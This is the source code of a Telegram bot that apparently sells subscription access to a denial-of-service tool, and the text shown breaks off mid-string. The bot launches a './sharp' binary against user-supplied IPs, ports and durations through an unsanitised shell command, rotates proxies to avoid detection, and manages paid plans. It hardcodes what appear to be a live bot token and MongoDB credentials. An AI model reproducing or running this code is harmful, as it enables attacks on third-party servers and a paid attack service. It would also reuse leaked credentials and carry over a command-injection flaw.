import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

# Bot Configuration: Set with Authority
TOKEN = '6838193855:AAHi1KDZv6Xgz_9yONP_dpF_TlrHcNQ03EU'
ADMIN_USER_ID = 6512242172
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
USERNAME = "@offx_sahil"  # Immutable username for maximum security

# Attack Status Variable to Control Single Execution
attack_in_progress = False

# Logging for Precision Monitoring
logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)

# MongoDB Connection - Operative Data Storage
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['sharp']
users_collection = db.users

# Bot Initialization
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Asyncio Loop for Operations
async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

# Proxy Update Command with Dark Authority
def update_proxy():
    proxy_list = []  # Define proxies here
    proxy = random.choice(proxy_list) if proxy_list else None
    if proxy:
        telebot.apihelper.proxy = {'https': proxy}
        logging.info("🕴️ Proxy shift complete. Surveillance evaded.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, f"🔄 Proxy locked in. We’re untouchable. Bot by {USERNAME}")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Proxy config failed: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Attack Initiation - Operative Status Checks and Intensity
async def run_attack_command_async(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True  # Set the flag to indicate an attack is in progress

    process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration}")
    await process.communicate()

    attack_in_progress = False  # Reset the flag after the attack is complete
    notify_attack_finished(target_ip, target_port, duration)

# Final Attack Message Upon Completion
def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_USER_ID,
        f"🔥 *MISSION ACCOMPLISHED!* 🔥\n\n"
        f"🎯 *TARGET NEUTRALIZED:* `{target_ip}`\n"
        f"💣 *PORT BREACHED:* `{target_port}`\n"
        f"⏳ *DURATION:* `{duration} seconds`\n\n"
        f"💥 *Operation Complete. No Evidence Left Behind. Courtesy of {USERNAME}*",
        parse_mode='Markdown'
    )

# Add User Command
@bot.message_handler(commands=['add_user'])
def add_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Ensure only the admin can add users
    if user_id != ADMIN_USER_ID:
        bot.send_message(chat_id, f"🚫 *Access Denied. Only {USERNAME} controls this realm.*", parse_mode='Markdown')
        return

    # Request the user to input the new user details (ID, plan, days, months, years)
    bot.send_message(chat_id, f"📝 *Provide the user details:*\n\n"
                             f"Format: `/add_user <user_id> <plan> <days> <months> <years>`\n\n"
                             f"Example: `/add_user 12345678 1 30 6 1`"
                             f"Where:\n"
                             f"- `user_id`: The new user's ID.\n"
                             f"- `plan`: Plan level (1 for basic, 2 for premium).\n"
                             f"- `days`: Access duration in days.\n"
                             f"- `months`: Access duration in months.\n"
                             f"- `years`: Access duration in years.")

    bot.register_next_step_handler(message, process_add_user_command)

def process_add_user_command(message):
    chat_id = message.chat.id
    try:
        # Extract the user input
        args = message.text.split()
        if len(args) != 5:
            bot.send_message(chat_id, f"⚠️ *Invalid format. Please follow the correct format.*", parse_mode='Markdown')
            return
        
        target_user_id = int(args[0])  # The user ID to be added
        plan = int(args[1])             # The plan (1 or 2)
        days = int(args[2])             # Duration in days
        months = int(args[3])           # Duration in months
        years = int(args[4])            # Duration in years

        # Calculate the valid_until date
        current_date = datetime.now()
        valid_until = current_date + timedelta(days=days) + timedelta(days=months * 30)  # Rough estimate for months
        valid_until = valid_until.replace(year=current_date.year + years)

        # Check if the plan is available (plan 1 or plan 2)
        limit_reached = (plan == 1 and users_collection.count_documents({"plan": 1}) >= 99) or \
                        (plan == 2 and users_collection.count_documents({"plan": 2}) >= 499)
        if limit_reached:
            bot.send_message(chat_id, f"⚠️ *Plan limit reached. Cannot add more users for this plan.*", parse_mode='Markdown')
            return

        # Add user to the database
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until.date().isoformat(), "access_count": 0}},
            upsert=True
        )
        
        # Success message
        msg_text = f"*User {target_user_id} added successfully – Plan {plan} for {days} days, {months} months, {years} years.* Approved by {USERNAME}"
        bot.send_message(chat_id, msg_text, parse_mode='Markdown')
        
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ *Error occurred while adding the user.*", parse_mode='Markdown')
        logging.error(f"Error in add_user command: {e}")

# Approve/Disapprove Command
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if user_id != ADMIN_USER_ID:
        bot.send_message(chat_id, f"🚫 *Access Denied. Only {USERNAME} controls this realm.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, f"📝 *Format: /approve <user_id> <plan> <days> or /disapprove <user_id>. Reserved by {USERNAME}*", parse_mode='Markdown')
        return

    action, target_user_id = cmd_parts[0], int(cmd_parts[1])
    plan, days = (int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0), (int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0)

    if action == '/approve':
        limit_reached = (plan == 1 and users_collection.count_documents({"plan": 1}) >= 99) or \
                        (plan == 2 and users_collection.count_documents({"plan": 2}) >= 499)
        if limit_reached:
            bot.send_message(chat_id, f"⚠️ *Plan limit reached. Access denied. Controlled by {USERNAME}*", parse_mode='Markdown')
            return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} granted access – Plan {plan} for {days} days. Approved by {USERNAME}*"
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} removed. Clearance by {USERNAME
